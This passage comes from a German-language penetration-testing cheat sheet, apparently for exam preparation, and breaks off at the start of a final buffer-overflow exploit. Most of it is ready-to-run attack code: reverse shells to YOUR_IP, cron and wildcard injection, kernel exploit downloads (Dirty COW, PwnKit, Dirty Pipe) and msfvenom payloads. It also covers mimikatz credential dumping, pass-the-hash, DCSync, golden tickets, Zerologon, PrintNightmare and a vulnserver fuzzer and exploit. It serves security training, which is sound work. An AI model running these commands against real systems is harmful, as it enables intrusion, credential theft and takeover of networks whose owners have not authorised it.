echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /usr/local/bin/backup.sh

# Listener starten:
nc -lvnp 4444

# Warten bis Cron läuft (max 1 Minute)
# Du bekommst Root Shell!
```

**Wildcard Injection:**

```bash
# Beispiel Cron:
* * * * * root tar czf /backup/backup.tar.gz /var/www/html/*

# Exploit (Wildcard Expansion):
cd /var/www/html
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# Wenn tar läuft, wird shell.sh als root ausgeführt!
```

**PATH Injection in Cron:**

```bash
# Cron Script nutzt relative Pfade:
#!/bin/bash
backup_files

# Exploit:
echo '#!/bin/bash' > /tmp/backup_files
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /tmp/backup_files
chmod +x /tmp/backup_files

# In Crontab PATH manipulieren (falls möglich):
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### 3.5 Kernel Exploits

**Kernel Version ermitteln:**

```bash
uname -a
uname -r
cat /proc/version
```

**Exploit suchen:**

```bash
# Lokal mit searchsploit:
searchsploit linux kernel 4.4
searchsploit ubuntu 16.04

# Online:
https://www.exploit-db.com/
```

**Dirty COW (CVE-2016-5195):**

```bash
# Funktioniert auf Kernel < 4.8.3

# Download:
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt

# Exploit ausführen:
./dirty YOUR_PASSWORD

# Login als firefart:
su firefart
# Password: YOUR_PASSWORD
# Du bist root!
```

**Dirty Pipe (CVE-2022-0847):**

```bash
# Kernel 5.8 - 5.16.11

# Download:
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
gcc exploit-1.c -o exploit

# Exploit:
./exploit
# Automatisch root!
```

**PwnKit (CVE-2021-4034):**

```bash
# Polkit Exploit

# Download:
wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o exploit

# Exploit:
./exploit
# Root shell!
```

### 3.6 NFS Exploits

**NFS Shares finden:**

```bash
# Auf victim:
cat /etc/exports

# Output Beispiel:
/srv/nfs 192.168.1.0/24(rw,sync,no_root_squash)

# no_root_squash = Exploit möglich!
```

**Von Attacker Machine aus:**

```bash
# 1. NFS Shares anzeigen
showmount -e 192.168.1.100

# 2. Mount
mkdir /tmp/nfs
mount -o rw 192.168.1.100:/srv/nfs /tmp/nfs

# 3. SUID Binary erstellen
cd /tmp/nfs
cat > shell.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

# 4. Kompilieren
gcc shell.c -o shell

# 5. SUID Bit setzen (als root auf Attacker)
chmod +s shell

# 6. Auf Victim ausführen
cd /srv/nfs
./shell
# Root shell!
```

### 3.7 Docker Escape

**Docker Group Mitgliedschaft:**

```bash
# Check:
id
groups

# Wenn du in "docker" Gruppe bist:
docker images

# Exploit:
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# Du bist root auf Host!

# Oder:
docker run -v /:/mnt --rm -it alpine sh
chroot /mnt
# Root!
```

**Docker Socket:**

```bash
# Socket finden:
ls -la /var/run/docker.sock

# Wenn writable:
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### 3.8 Capabilities

**Capabilities finden:**

```bash
getcap -r / 2>/dev/null

# Output Beispiel:
/usr/bin/python3.8 = cap_setuid+ep
```

**Python mit cap_setuid:**

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Perl mit cap_setuid:**

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

---

## 4. WINDOWS PRIVILEGE ESCALATION

### 4.1 Enumeration

**Basic Info:**

```cmd
whoami
whoami /priv
whoami /groups
net user
net user USERNAME
net localgroup
net localgroup administrators
systeminfo
hostname

# PowerShell:
Get-ComputerInfo
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
```

**Automatisierte Enumeration:**

```powershell
# WinPEAS
# Upload winPEASx64.exe
.\winPEASx64.exe

# PowerUp
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Watson (Patch Enumeration)
.\watson.exe
```

### 4.2 Unquoted Service Paths

**Service Paths finden:**

```cmd
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows"

# Output Beispiel:
VulnService    C:\Program Files\Vulnerable App\service.exe    Auto
```

**Exploit:**

```cmd
# Pfad: C:\Program Files\Vulnerable App\service.exe
# Windows versucht zu starten:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable App\service.exe

# Exploit:
# 1. Reverse Shell erstellen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o Vulnerable.exe

# 2. Upload nach C:\Program Files\
# Benötigt Schreibrechte!
icacls "C:\Program Files"

# 3. Service neustarten
sc stop VulnService
sc start VulnService

# 4. Listener
nc -lvnp 4444
```

### 4.3 Weak Service Permissions

**Service Permissions checken:**

```cmd
# accesschk.exe download von Sysinternals
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Users" *

# Output:
VulnService
  RW Everyone
    SERVICE_ALL_ACCESS
```

**Exploit:**

```cmd
# 1. Payload erstellen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o evil.exe

# 2. Upload nach C:\temp\evil.exe

# 3. Service Binary Path ändern
sc config VulnService binpath= "C:\temp\evil.exe"

# 4. Service neustarten
sc stop VulnService
sc start VulnService

# 5. Listener
nc -lvnp 4444
# System Shell!
```

### 4.4 AlwaysInstallElevated

**Registry checken:**

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Beide müssen 0x1 sein!
```

**Exploit:**

```cmd
# 1. MSI Payload erstellen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o evil.msi

# 2. Upload

# 3. Installieren
msiexec /quiet /qn /i C:\temp\evil.msi

# Wird als SYSTEM ausgeführt!
```

### 4.5 SeImpersonatePrivilege

**Privilege checken:**

```cmd
whoami /priv

# Output:
SeImpersonatePrivilege        Enabled
```

**PrintSpoofer (Windows 10/Server 2016+):**

```cmd
# Download: https://github.com/itm4n/PrintSpoofer

# Exploit:
.\PrintSpoofer.exe -i -c cmd
# System Shell!

# Oder direkt Reverse Shell:
.\PrintSpoofer.exe -c "C:\temp\nc.exe YOUR_IP 4444 -e cmd"
```

**JuicyPotato (Windows Server 2016 und älter):**

```cmd
# Download: https://github.com/ohpe/juicy-potato

# Exploit:
.\JuicyPotato.exe -l 1337 -p C:\temp\nc.exe -a "YOUR_IP 4444 -e cmd" -t *

# CLSID Liste: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
```

**RoguePotato:**

```cmd
# 1. Auf Attacker: socat Redirector
sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999

# 2. Auf Victim:
.\RoguePotato.exe -r YOUR_IP -e "C:\temp\nc.exe YOUR_IP 4444 -e cmd" -l 9999
```

### 4.6 Registry AutoRuns

**AutoRun Keys checken:**

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# PowerShell:
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Permissions checken:
accesschk.exe -wvu "C:\Program Files\Startup\program.exe"
```

**Exploit:**

```cmd
# 1. Payload erstellen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o backdoor.exe

# 2. Original ersetzen (wenn writable)
move C:\Program Files\Startup\program.exe C:\Program Files\Startup\program.exe.bak
move backdoor.exe "C:\Program Files\Startup\program.exe"

# 3. Warten auf Reboot oder User Login
# Root Shell!
```

### 4.7 Saved Credentials

**Credentials suchen:**

```cmd
# Saved Credentials
cmdkey /list

# Wenn Credentials gespeichert:
runas /savecred /user:Administrator cmd

# Oder Payload ausführen:
runas /savecred /user:Administrator "C:\temp\evil.exe"
```

**Browser Credentials:**

```powershell
# Chrome
dir C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data

# Firefox
dir C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json
```

**Credential Manager:**

```cmd
# Mit mimikatz
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Oder:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### 4.8 SAM/SYSTEM Hashes

**Registry Hives dumpen:**

```cmd
# Wenn Admin oder SYSTEM:
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system

# Oder via Volume Shadow Copy:
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system

# Download zu Attacker
```

**Hashes extrahieren:**

```bash
# Mit secretsdump.py (Impacket):
secretsdump.py -sam sam -system system LOCAL

# Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Pass-the-Hash:**

```bash
# Mit pth-winexe:
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //TARGET_IP cmd

# Mit Evil-WinRM:
evil-winrm -i TARGET_IP -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Mit psexec.py:
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@TARGET_IP
```

---

## 5. PIVOTING & LATERAL MOVEMENT

### 5.1 Network Discovery nach Foothold

**Interfaces finden:**

```bash
# Linux:
ifconfig
ip a
ip route

# Windows:
ipconfig
ipconfig /all
route print
```

**Beispiel Output:**
```
eth0: 10.10.10.50 (Externes Netz - von hier bist du reingekommen)
eth1: 172.16.1.50 (Internes Netz - PIVOT HIER!)
```

**Interne Hosts scannen:**

```bash
# Statische Binaries nutzen (keine nmap verfügbar)

# Mit bash (langsam):
for i in {1..254}; do
  ping -c 1 -W 1 172.16.1.$i &
done

# Port Scan mit bash:
for port in {1..1000}; do
  timeout 1 bash -c "</dev/tcp/172.16.1.10/$port" && echo "Port $port open"
done 2>/dev/null
```

**Nmap statisch hochladen:**

```bash
# Auf Attacker:
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
python3 -m http.server 80

# Auf Pivot:
wget http://YOUR_IP/nmap
chmod +x nmap
./nmap -sn 172.16.1.0/24
./nmap -p 22,80,445,3389 172.16.1.0/24
```

### 5.2 SSH Tunneling

**Dynamic Port Forward (SOCKS Proxy):**

```bash
# Von deinem Attacker:
ssh -D 1080 user@10.10.10.50

# Proxychains konfigurieren:
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf

# Jetzt durch Pivot scannen:
proxychains nmap -sT -Pn 172.16.1.10
proxychains firefox  # Browser durch Tunnel
proxychains msfconsole
```

**Local Port Forward:**

```bash
# Port von Pivot zu dir forwarden
ssh -L 8080:172.16.1.10:80 user@10.10.10.50

# Jetzt: localhost:8080 → 172.16.1.10:80
firefox http://localhost:8080
```

**Remote Port Forward:**

```bash
# Port von dir zum Pivot
ssh -R 8080:localhost:80 user@10.10.10.50

# Auf Pivot: localhost:8080 → Dein localhost:80
```

### 5.3 Chisel (Besser als SSH!)

**Setup:**

```bash
# Download:
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel

# Windows Version auch downloaden!
```

**SOCKS Proxy:**

```bash
# Auf Attacker (Server):
./chisel server -p 8000 --reverse

# Auf Pivot (Client):
./chisel client YOUR_IP:8000 R:socks

# Proxychains Config:
echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf

# Nutzen:
proxychains nmap -sT -Pn 172.16.1.10
```

**Port Forward:**

```bash
# Auf Attacker:
./chisel server -p 8000 --reverse

# Auf Pivot:
./chisel client YOUR_IP:8000 R:3389:172.16.1.10:3389

# Jetzt: localhost:3389 → 172.16.1.10:3389
rdesktop localhost:3389
```

### 5.4 Metasploit Pivoting

**Nach Meterpreter Session:**

```bash
meterpreter> run autoroute -s 172.16.1.0/24

# Route checken:
meterpreter> run autoroute -p

# Jetzt Module gegen internes Netz nutzen:
background

msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 172.16.1.0/24
msf> set PORTS 22,80,445,3389
msf> run
```

**SOCKS Proxy in Metasploit:**

```bash
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> set VERSION 4a
msf> run -j

# Proxychains nutzen:
proxychains nmap -sT -Pn 172.16.1.10
```

**Port Forward in Meterpreter:**

```bash
meterpreter> portfwd add -l 3389 -p 3389 -r 172.16.1.10

# Jetzt: localhost:3389 → 172.16.1.10:3389
rdesktop localhost:3389

# Port Forward löschen:
meterpreter> portfwd delete -l 3389
```

### 5.5 Ligolo-ng (Modernste Lösung)

**Setup:**

```bash
# Download:
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz

# Interface erstellen (auf Attacker):
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Proxy starten (Attacker):
./proxy -selfcert

# Agent starten (Victim):
./agent -connect YOUR_IP:11601 -ignore-cert

# Im Proxy:
ligolo-ng» session
ligolo-ng» start
ligolo-ng» listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444

# Route hinzufügen (neues Terminal auf Attacker):
sudo ip route add 172.16.1.0/24 dev ligolo

# Jetzt direkt scannen (kein proxychains!):
nmap -sT -Pn 172.16.1.10
```

### 5.6 Credential Reuse

**Nach Cred-Fund testen:**

```bash
# SSH:
ssh user@172.16.1.10

# RDP:
rdesktop 172.16.1.10
xfreerdp /u:user /p:password /v:172.16.1.10

# SMB:
smbclient -L //172.16.1.10 -U user%password
psexec.py user:password@172.16.1.10

# WinRM:
evil-winrm -i 172.16.1.10 -u user -p password

# Mit Hashes (Pass-the-Hash):
psexec.py -hashes LM:NT user@172.16.1.10
evil-winrm -i 172.16.1.10 -u user -H NT_HASH
```

### 5.7 Reverse Shells durch Pivot

**Problem:** Target kann dich nicht direkt erreichen

**Lösung 1: Port Forward + Shell**

```bash
# Pivot hat Port 4444 offen zu dir
# Target sendet Shell an Pivot:4444
# Pivot forwarded zu dir

# Auf Pivot (Linux):
socat TCP-LISTEN:4444,fork TCP:YOUR_IP:4444

# Auf Target:
bash -i >& /dev/tcp/PIVOT_IP/4444 0>&1

# Listener auf deiner Maschine:
nc -lvnp 4444
```

**Lösung 2: Chisel Reverse Proxy**

```bash
# Auf Attacker:
./chisel server -p 8000 --reverse

# Auf Pivot:
./chisel client YOUR_IP:8000 R:4444:localhost:4444

# Listener auf Attacker:
nc -lvnp 4444

# Auf Target (sendet zu Pivot localhost):
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

---

## 6. ACTIVE DIRECTORY ATTACKS

### 6.1 Initial Enumeration

**Ohne Credentials:**

```bash
# Null Session Enumeration
enum4linux -a 10.10.10.100
rpcclient -U "" -N 10.10.10.100

# LDAP Enumeration
ldapsearch -x -H ldap://10.10.10.100 -s base

# DNS Enumeration
nslookup
> server 10.10.10.100
> domain.local

dig axfr @10.10.10.100 domain.local
```

**Mit Credentials (Linux):**

```bash
# User Enumeration
ldapsearch -x -H ldap://10.10.10.100 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=user)" | grep sAMAccountName

# Impacket Tools:
# User Enumeration
GetADUsers.py domain.local/user:password -dc-ip 10.10.10.100 -all

# Shares Enumeration
smbmap -u user -p password -d domain.local -H 10.10.10.100
smbclient -L //10.10.10.100 -U domain.local/user%password

# Password Spraying
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123' -d domain.local
```

**Mit Credentials (Windows):**

```powershell
# PowerView
Import-Module .\PowerView.ps1

# Domain Info
Get-NetDomain
Get-NetDomainController

# Users
Get-NetUser
Get-NetUser -SPN  # Kerberoastable users

# Groups
Get-NetGroup
Get-NetGroup "Domain Admins" | Get-NetGroupMember

# Computers
Get-NetComputer
Get-NetComputer | Select-Object name

# Shares
Invoke-ShareFinder

# Sessions (wo sind Admins eingeloggt?)
Invoke-UserHunter

# ACLs
Get-ObjectAcl -SamAccountName "user" -ResolveGUIDs

# Trusts
Get-NetDomainTrust
```

### 6.2 BloodHound

**Collection (Windows):**

```powershell
# SharpHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName output.zip

# Oder direkt:
.\SharpHound.exe -c All -d domain.local

# Download output.zip
```

**Collection (Linux):**

```bash
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.100 -c all

# Output: *.json files
```

**BloodHound starten:**

```bash
# Neo4j starten:
sudo neo4j console

# Browser: http://localhost:7474
# Default Creds: neo4j:neo4j (ändern!)

# BloodHound starten:
bloodhound

# JSON Files uploaden
# Analysis Tab → Queries nutzen!
```

**Wichtige Queries:**
- Find Shortest Path to Domain Admins
- Find Principals with DCSync Rights
- Find Kerberoastable Users
- Find AS-REP Roastable Users
- Find Computers where Domain Users are Local Admin

### 6.3 Kerberoasting

**Attack:**

```bash
# Mit Impacket (Linux):
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request

# Output: TGS Tickets (Hashes)
$krb5tgs$23$*sqlservice$DOMAIN.LOCAL$...
```

```powershell
# Mit PowerView (Windows):
Get-NetUser -SPN | select serviceprincipalname

# Mit Rubeus:
.\Rubeus.exe kerberoast /simple /nowrap

# Output: Hashcat format
```

**Hash Cracking:**

```bash
# Hash in File speichern:
echo '$krb5tgs$23$*...' > hash.txt

# Hashcat:
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force

# John:
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 6.4 AS-REP Roasting

**Attack:**

```bash
# Ohne Pre-Auth Users finden und attackieren:
GetNPUsers.py domain.local/ -dc-ip 10.10.10.100 -usersfile users.txt -format hashcat

# Oder mit Username:
GetNPUsers.py domain.local/user -dc-ip 10.10.10.100 -no-pass

# Output: AS-REP Hash
```

```powershell
# Mit Rubeus:
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

**Hash Cracking:**

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

### 6.5 Pass-the-Hash / Pass-the-Ticket

**Pass-the-Hash:**

```bash
# Mit psexec.py:
psexec.py -hashes :NT_HASH domain.local/user@10.10.10.100

# Mit evil-winrm:
evil-winrm -i 10.10.10.100 -u user -H NT_HASH

# Mit crackmapexec:
crackmapexec smb 10.10.10.100 -u user -H NT_HASH -x "whoami"

# Mit wmiexec.py:
wmiexec.py -hashes :NT_HASH domain.local/user@10.10.10.100
```

**Pass-the-Ticket:**

```bash
# 1. Ticket exportieren (mit Mimikatz):
mimikatz # sekurlsa::tickets /export

# 2. Ticket in Linux nutzen:
export KRB5CCNAME=ticket.kirbi
psexec.py domain.local/user@target -k -no-pass

# 3. Oder mit ticketer.py neues Ticket erstellen:
ticketer.py -nthash NT_HASH -domain-sid S-1-5-21-... -domain domain.local user

export KRB5CCNAME=user.ccache
psexec.py domain.local/user@target -k -no-pass
```

### 6.6 DCSync Attack

**Voraussetzung:** Replicating Directory Changes Rights

**Attack:**

```bash
# Mit secretsdump.py (empfohlen):
secretsdump.py domain.local/user:password@10.10.10.100 -just-dc

# Output: Alle NTLM Hashes (inkl. krbtgt!)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:hash:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:hash:::

# Nur NTLM:
secretsdump.py domain.local/user:password@10.10.10.100 -just-dc-ntlm

# Mit Hash statt Passwort:
secretsdump.py -hashes :NT_HASH domain.local/user@10.10.10.100 -just-dc
```

```powershell
# Mit Mimikatz:
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

**Jetzt Domain Admin:**

```bash
# Pass-the-Hash mit Admin:
psexec.py -hashes :ADMIN_HASH domain.local/Administrator@10.10.10.100
```

### 6.7 Golden Ticket

**Voraussetzung:** krbtgt Hash (von DCSync)

**Attack:**

```bash
# Infos sammeln:
# 1. Domain SID
lookupsid.py domain.local/user:password@10.10.10.100

# Output: S-1-5-21-1234567890-1234567890-1234567890

# 2. Golden Ticket erstellen:
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator

# 3. Ticket nutzen:
export KRB5CCNAME=Administrator.ccache
psexec.py domain.local/Administrator@DC -k -no-pass

# Jetzt bist du Domain Admin!
```

```powershell
# Mit Mimikatz:
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-... /rc4:KRBTGT_HASH /user:Administrator /ptt

# Shell als DA:
mimikatz # misc::cmd
```

### 6.8 Silver Ticket

**Attack (Service-spezifisch):**

```bash
# Beispiel: CIFS Service
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local Administrator

export KRB5CCNAME=Administrator.ccache
smbclient.py domain.local/Administrator@target -k -no-pass
```

### 6.9 Zerologon (CVE-2020-1472)

**Test:**

```bash
# Check if vulnerable:
python3 zerologon_tester.py DC_NAME 10.10.10.100
```

**Exploit:**

```bash
# 1. Set DC password to empty:
python3 cve-2020-1472-exploit.py DC_NAME 10.10.10.100

# 2. Dump hashes:
secretsdump.py -no-pass -just-dc domain.local/DC_NAME\$@10.10.10.100

# 3. Restore DC password (wichtig!):
python3 restorepassword.py domain.local/DC_NAME@DC_NAME -target-ip 10.10.10.100 -hexpass ORIGINAL_HEX
```

**Warnung:** Kann Domain crashen! Nur in Prüfung nutzen wenn erlaubt!

### 6.10 PrintNightmare (CVE-2021-1675)

**Check:**

```bash
rpcdump.py @10.10.10.100 | grep -A 5 MS-RPRN
```

**Exploit:**

```bash
# 1. DLL Payload erstellen:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o shell.dll

# 2. SMB Share mit DLL:
smbserver.py share . -smb2support

# 3. Exploit:
python3 CVE-2021-1675.py domain.local/user:password@10.10.10.100 '\\YOUR_IP\share\shell.dll'

# 4. Listener:
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run

# SYSTEM Shell!
```

---

## 7. BUFFER OVERFLOW (x86)

### 7.1 Setup

**Debugger (Windows):**
- Immunity Debugger + mona.py
- x32dbg (alternative)

**Vulnerable App für Übung:**
- vulnserver.exe
- brainpan.exe (Offensive Security)

### 7.2 Fuzzing

**Fuzzer Script:**

```python
#!/usr/bin/env python3
import socket
import sys

# Ziel
ip = "192.168.1.100"
port = 9999

# Buffer
buffer = "A" * 100

while True:
    try:
        print(f"Fuzzing with {len(buffer)} bytes")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        
        # Command + Buffer senden
        payload = "TRUN /.:/" + buffer
        s.send(payload.encode())
        s.recv(1024)
        s.close()
        
        # Buffer vergrößern
        buffer += "A" * 100
        
    except Exception as e:
        print(f"Crashed at {len(buffer)} bytes")
        print(f"Error: {e}")
        sys.exit(0)
```

**Crash bei ca. 2000 bytes → Exploit möglich!**

### 7.3 Offset finden

**Pattern erstellen:**

```bash
# Metasploit pattern_create:
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

# Output kopieren
```

**Exploit Script:**

```python
#!/usr/bin/env python3
import socket

ip = "192.168.1.100"
port = 9999

# Pattern von pattern_create
offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A..."

payload = "TRUN /.:/" + offset

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(payload.encode())
s.close()
```

**In Immunity Debugger:**
- App crashed
- EIP Register zeigt z.B.: `386F4337`

**Offset berechnen:**

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337 -l 3000

# Output: Exact match at offset 2003
```

**EIP Control verifizieren:**

```python
#!/usr/bin/env python3
import socket

ip = "192.168.1.100"
port = 9999

offset = 2003
buffer = "A" * offset
eip = "B" * 4         # Sollte EIP überschreiben
padding = "C" * 500

payload = buffer + eip + padding
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(("TRUN /.:/" + payload).encode())
s.close()
```

**In Debugger: EIP = 42424242 (BBBB) → Perfekt!**

### 7.4 Bad Characters finden

**Bad Char Array generieren:**

```python
badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

**Test Script:**

```python
#!/usr/bin/env python3
import socket

ip = "192.168.1.100"
port = 9999

offset = 2003
buffer = b"A" * offset
eip = b"B" * 4

badchars = b"\x01\x02\x03..." # Full array von oben

payload = buffer + eip + badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(b"TRUN /.:/" + payload)
s.close()
```

**In Immunity:**
1. Rechtsklick auf ESP → Follow in Dump
2. Vergleichen mit badchars Array
3. Fehlende/veränderte Bytes = Bad Chars

**Häufige Bad Chars:**
- `\x00` (NULL) - Fast immer
- `\x0a` (Line Feed) - Oft
- `\x0d` (Carriage Return) - Oft
- `\x20` (Space) - Manchmal

**Beispiel: \x00, \x0a, \x0d sind bad**

### 7.5 JMP ESP finden

**In Immunity + mona.py:**

```
!mona modules
```

**Suche Modul mit:**
- ASLR: False
- Rebase: False
- SafeSEH: False
- NXCompat: False

**Beispiel:** `essfunc.dll` ist gut

**JMP ESP OpCode finden:**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

**Output Beispiel:**
```
0x625011af : "\xff\xe4" | {PAGE_EXECUTE_READ} [essfunc.dll]
0x625011bb : "\xff\xe4" | {PAGE_EXECUTE_READ} [essfunc.dll]
```

**Wähle Adresse ohne Bad Chars:**
- `625011af` → `\xaf\x11\x50\x62` (Little Endian!)
- Keine `\x00, \x0a, \x0d` → Gut!

### 7.6 Shellcode generieren

```bash
# Reverse Shell erstellen:
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f c -b "\x00\x0a\x0d"

# Output:
unsigned char buf[] = 
"\xda\xc1\xba\x37\x5d\xcd\x6a\xd9\x74\x24\xf4\x5e\x29\xc9..."

# -f c = C format
# -b = Bad chars to avoid
```

### 7.7 Final Exploit

```python
#!/usr/bin/env python3
import socket

ip = "192.168.1.100"
port = 9999

# Offset
offset = 2003
